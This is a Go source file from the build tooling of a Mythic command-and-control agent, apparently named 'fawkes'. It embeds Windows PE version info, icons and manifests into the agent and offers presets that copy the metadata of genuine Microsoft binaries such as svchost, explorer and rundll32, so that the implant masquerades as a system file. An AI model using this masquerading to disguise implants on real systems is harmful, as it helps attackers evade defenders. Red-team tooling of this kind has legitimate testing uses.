package agentfunctions

import (
	"bytes"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

// pePresetInfo contains Windows PE version info fields for a preset binary identity
type pePresetInfo struct {
	Company      string
	Description  string
	Product      string
	Version      string
	Copyright    string
	OriginalFile string
	InternalName string
}

// pePresets maps preset names to version info for impersonating legitimate Windows binaries.
// Values match real Windows 10 21H2 binaries.
var pePresets = map[string]pePresetInfo{
	"notepad": {
		Company:      "Microsoft Corporation",
		Description:  "Notepad",
		Product:      "Microsoft® Windows® Operating System",
		Version:      "10.0.19041.3636",
		Copyright:    "© Microsoft Corporation. All rights reserved.",
		OriginalFile: "NOTEPAD.EXE",
		InternalName: "Notepad",
	},
	"svchost": {
		Company:      "Microsoft Corporation",
		Description:  "Host Process for Windows Services",
		Product:      "Microsoft® Windows® Operating System",
		Version:      "10.0.19041.1",
		Copyright:    "© Microsoft Corporation. All rights reserved.",
		OriginalFile: "svchost.exe",
		InternalName: "svchost.exe",
	},
	"cmd": {
		Company:      "Microsoft Corporation",
		Description:  "Windows Command Processor",
		Product:      "Microsoft® Windows® Operating System",
		Version:      "10.0.19041.3636",
		Copyright:    "© Microsoft Corporation. All rights reserved.",
		OriginalFile: "Cmd.Exe",
		InternalName: "cmd",
	},
	"explorer": {
		Company:      "Microsoft Corporation",
		Description:  "Windows Explorer",
		Product:      "Microsoft® Windows® Operating System",
		Version:      "10.0.19041.3636",
		Copyright:    "© Microsoft Corporation. All rights reserved.",
		OriginalFile: "EXPLORER.EXE",
		InternalName: "explorer",
	},
	"msiexec": {
		Company:      "Microsoft Corporation",
		Description:  "Windows® installer",
		Product:      "Windows Installer - Unicode",
		Version:      "5.0.19041.1",
		Copyright:    "© Microsoft Corporation. All rights reserved.",
		OriginalFile: "msiexec.exe",
		InternalName: "msiexec",
	},
	"dllhost": {
		Company:      "Microsoft Corporation",
		Description:  "COM Surrogate",
		Product:      "Microsoft® Windows® Operating System",
		Version:      "10.0.19041.1",
		Copyright:    "© Microsoft Corporation. All rights reserved.",
		OriginalFile: "dllhost.exe",
		InternalName: "dllhost.exe",
	},
	"rundll32": {
		Company:      "Microsoft Corporation",
		Description:  "Windows host process (Rundll32)",
		Product:      "Microsoft® Windows® Operating System",
		Version:      "10.0.19041.1",
		Copyright:    "© Microsoft Corporation. All rights reserved.",
		OriginalFile: "RUNDLL32.EXE",
		InternalName: "rundll32",
	},
	"conhost": {
		Company:      "Microsoft Corporation",
		Description:  "Console Window Host",
		Product:      "Microsoft® Windows® Operating System",
		Version:      "10.0.19041.1",
		Copyright:    "© Microsoft Corporation. All rights reserved.",
		OriginalFile: "conhost.exe",
		InternalName: "conhost.exe",
	},
	"taskhostw": {
		Company:      "Microsoft Corporation",
		Description:  "Host Process for Windows Tasks",
		Product:      "Microsoft® Windows® Operating System",
		Version:      "10.0.19041.1",
		Copyright:    "© Microsoft Corporation. All rights reserved.",
		OriginalFile: "taskhostw.exe",
		InternalName: "taskhostw.exe",
	},
	"RuntimeBroker": {
		Company:      "Microsoft Corporation",
		Description:  "Runtime Broker",
		Product:      "Microsoft® Windows® Operating System",
		Version:      "10.0.19041.1",
		Copyright:    "© Microsoft Corporation. All rights reserved.",
		OriginalFile: "RuntimeBroker.exe",
		InternalName: "RuntimeBroker.exe",
	},
}

// peResourceConfig holds resolved PE resource embedding parameters
type peResourceConfig struct {
	Company       string
	Description   string
	Product       string
	Version       string
	Copyright     string
	OriginalFile  string
	InternalName  string
	IconData      []byte
	ManifestLevel string // "as invoker", "highest available", "require administrator", or ""
	PresetName    string // for reporting
}

func (c *peResourceConfig) hasResources() bool {
	return c.Company != "" || c.Description != "" || c.Product != "" || c.Version != "" ||
		c.Copyright != "" || c.OriginalFile != "" || len(c.IconData) > 0 || c.ManifestLevel != ""
}

// collectPEResourceConfig reads PE resource build parameters and applies preset defaults.
// Individual fields override preset values.
func collectPEResourceConfig(buildMsg agentstructs.PayloadBuildMessage) (*peResourceConfig, error) {
	cfg := &peResourceConfig{}

	// Apply preset first
	if preset, err := buildMsg.BuildParameters.GetStringArg("pe_preset"); err == nil && preset != "" && preset != "none" {
		if p, ok := pePresets[preset]; ok {
			cfg.Company = p.Company
			cfg.Description = p.Description
			cfg.Product = p.Product
			cfg.Version = p.Version
			cfg.Copyright = p.Copyright
			cfg.OriginalFile = p.OriginalFile
			cfg.InternalName = p.InternalName
			cfg.PresetName = preset
		}
	}

	// Override with individual fields (non-empty values take precedence)
	if v, err := buildMsg.BuildParameters.GetStringArg("pe_company"); err == nil && v != "" {
		cfg.Company = v
	}
	if v, err := buildMsg.BuildParameters.GetStringArg("pe_description"); err == nil && v != "" {
		cfg.Description = v
	}
	if v, err := buildMsg.BuildParameters.GetStringArg("pe_product"); err == nil && v != "" {
		cfg.Product = v
	}
	if v, err := buildMsg.BuildParameters.GetStringArg("pe_version"); err == nil && v != "" {
		cfg.Version = v
	}
	if v, err := buildMsg.BuildParameters.GetStringArg("pe_copyright"); err == nil && v != "" {
		cfg.Copyright = v
	}
	if v, err := buildMsg.BuildParameters.GetStringArg("pe_original_filename"); err == nil && v != "" {
		cfg.OriginalFile = v
	}

	// Icon file (FILE type parameter — returns UUID, download via MythicRPC)
	if fileID, err := buildMsg.BuildParameters.GetFileArg("pe_icon"); err == nil && fileID != "" {
		fileResp, err := mythicrpc.SendMythicRPCFileGetContent(mythicrpc.MythicRPCFileGetContentMessage{
			AgentFileID: fileID,
		})
		if err != nil {
			return nil, fmt.Errorf("failed to download PE icon: %v", err)
		}
		if !fileResp.Success {
			return nil, fmt.Errorf("failed to get PE icon content: %s", fileResp.Error)
		}
		cfg.IconData = fileResp.Content
	}

	// Manifest level
	if manifest, err := buildMsg.BuildParameters.GetStringArg("pe_manifest"); err == nil && manifest != "" && manifest != "none" {
		switch manifest {
		case "asInvoker":
			cfg.ManifestLevel = "as invoker"
		case "highestAvailable":
			cfg.ManifestLevel = "highest available"
		case "requireAdministrator":
			cfg.ManifestLevel = "require administrator"
		}
	}

	return cfg, nil
}

// generatePEResources creates a .syso file with Windows PE resources using go-winres.
// Returns a human-readable report of what was embedded.
func generatePEResources(agentCodeDir, arch string, cfg *peResourceConfig) (string, error) {
	// Create temp directory for winres config files
	tmpDir, err := os.MkdirTemp("", "fawkes-winres-")
	if err != nil {
		return "", fmt.Errorf("failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tmpDir)

	// Determine icon filename based on magic bytes
	iconFilename := ""
	if len(cfg.IconData) > 0 {
		iconFilename = detectIconFormat(cfg.IconData)
		iconPath := filepath.Join(tmpDir, iconFilename)
		if err := os.WriteFile(iconPath, cfg.IconData, 0644); err != nil {
			return "", fmt.Errorf("failed to write icon file: %v", err)
		}
	}

	// Build winres.json config
	winresConfig := buildWinresConfig(cfg, iconFilename)
	jsonBytes, err := json.MarshalIndent(winresConfig, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal winres.json: %v", err)
	}
	jsonPath := filepath.Join(tmpDir, "winres.json")
	if err := os.WriteFile(jsonPath, jsonBytes, 0644); err != nil {
		return "", fmt.Errorf("failed to write winres.json: %v", err)
	}

	// Run go-winres make
	outPrefix := filepath.Join(agentCodeDir, "rsrc")
	cmd := exec.Command("/go/bin/go-winres", "make",
		"--in", jsonPath,
		"--out", outPrefix,
		"--arch", arch,
	)
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		return "", fmt.Errorf("go-winres failed: %v\nstderr: %s", err, stderr.String())
	}

	// Verify .syso file was created
	sysoPath := filepath.Join(agentCodeDir, fmt.Sprintf("rsrc_windows_%s.syso", arch))
	fi, err := os.Stat(sysoPath)
	if err != nil {
		return "", fmt.Errorf(".syso file not found after go-winres: %v", err)
	}

	// Build report
	return buildPEResourceReport(cfg, fi.Size()), nil
}

// buildWinresConfig constructs the go-winres JSON config structure
func buildWinresConfig(cfg *peResourceConfig, iconFilename string) map[string]interface{} {
	config := make(map[string]interface{})

	// Version info
	hasVersionInfo := cfg.Company != "" || cfg.Description != "" || cfg.Product != "" ||
		cfg.Version != "" || cfg.Copyright != "" || cfg.OriginalFile != ""
	if hasVersionInfo {
		info := make(map[string]string)
		if cfg.Company != "" {
			info["CompanyName"] = cfg.Company
		}
		if cfg.Description != "" {
			info["FileDescription"] = cfg.Description
		}
		if cfg.Product != "" {
			info["ProductName"] = cfg.Product
		}
		if cfg.Copyright != "" {
			info["LegalCopyright"] = cfg.Copyright
		}
		if cfg.OriginalFile != "" {
			info["OriginalFilename"] = cfg.OriginalFile
		}
		if cfg.InternalName != "" {
			info["InternalName"] = cfg.InternalName
		}
		if cfg.Version != "" {
			info["FileVersion"] = cfg.Version
			info["ProductVersion"] = cfg.Version
		}

		fixed := make(map[string]string)
		if cfg.Version != "" {
			normalized := normalizeVersionString(cfg.Version)
			fixed["file_version"] = normalized
			fixed["product_version"] = normalized
		}

		config["RT_VERSION"] = map[string]interface{}{
			"#1": map[string]interface{}{
				"0000": map[string]interface{}{
					"fixed": fixed,
					"info": map[string]interface{}{
						"0409": info,
					},
				},
			},
		}
	}

	// Icon
	if iconFilename != "" {
		config["RT_GROUP_ICON"] = map[string]interface{}{
			"APP": map[string]interface{}{
				"0000": iconFilename,
			},
		}
	}

	// Manifest
	if cfg.ManifestLevel != "" {
		config["RT_MANIFEST"] = map[string]interface{}{
			"#1": map[string]interface{}{
				"0409": map[string]interface{}{
					"identity":        map[string]interface{}{},
					"minimum-os":      "win7",
					"execution-level": cfg.ManifestLevel,
					"dpi-awareness":   "system",
				},
			},
		}
	}

	return config
}

// normalizeVersionString ensures a version string has exactly 4 dot-separated components.
// "10.0.19041" -> "10.0.19041.0", "1.0" -> "1.0.0.0"
func normalizeVersionString(v string) string {
	parts := strings.Split(v, ".")
	for len(parts) < 4 {
		parts = append(parts, "0")
	}
	return strings.Join(parts[:4], ".")
}

// detectIconFormat returns the appropriate filename based on file magic bytes
func detectIconFormat(data []byte) string {
	if len(data) >= 4 && data[0] == 0x00 && data[1] == 0x00 && data[2] == 0x01 && data[3] == 0x00 {
		return "icon.ico"
	}
	if len(data) >= 4 && data[0] == 0x89 && data[1] == 'P' && data[2] == 'N' && data[3] == 'G' {
		return "icon.png"
	}
	return "icon.ico" // default assumption
}

// buildPEResourceReport generates a human-readable summary of embedded PE resources
func buildPEResourceReport(cfg *peResourceConfig, sysoSize int64) string {
	var report strings.Builder
	report.WriteString("=== PE Resource Embedding ===\n")
	if cfg.PresetName != "" {
		report.WriteString(fmt.Sprintf("Preset: %s\n", cfg.PresetName))
	}
	report.WriteString(fmt.Sprintf("Resource object: %d bytes\n\n", sysoSize))

	if cfg.Company != "" || cfg.Description != "" || cfg.Product != "" || cfg.Version != "" {
		report.WriteString("Version Info:\n")
		if cfg.Company != "" {
			report.WriteString(fmt.Sprintf("  CompanyName:      %s\n", cfg.Company))
		}
		if cfg.Description != "" {
			report.WriteString(fmt.Sprintf("  FileDescription:  %s\n", cfg.Description))
		}
		if cfg.Product != "" {
			report.WriteString(fmt.Sprintf("  ProductName:      %s\n", cfg.Product))
		}
		if cfg.Version != "" {
			report.WriteString(fmt.Sprintf("  FileVersion:      %s\n", cfg.Version))
		}
		if cfg.Copyright != "" {
			report.WriteString(fmt.Sprintf("  LegalCopyright:   %s\n", cfg.Copyright))
		}
		if cfg.OriginalFile != "" {
			report.WriteString(fmt.Sprintf("  OriginalFilename: %s\n", cfg.OriginalFile))
		}
		if cfg.InternalName != "" {
			report.WriteString(fmt.Sprintf("  InternalName:     %s\n", cfg.InternalName))
		}
	}

	if len(cfg.IconData) > 0 {
		report.WriteString(fmt.Sprintf("\nIcon: %d bytes (%s)\n", len(cfg.IconData), detectIconFormat(cfg.IconData)))
	}

	if cfg.ManifestLevel != "" {
		report.WriteString(fmt.Sprintf("\nManifest: execution-level=%s\n", cfg.ManifestLevel))
	}

	return report.String()
}
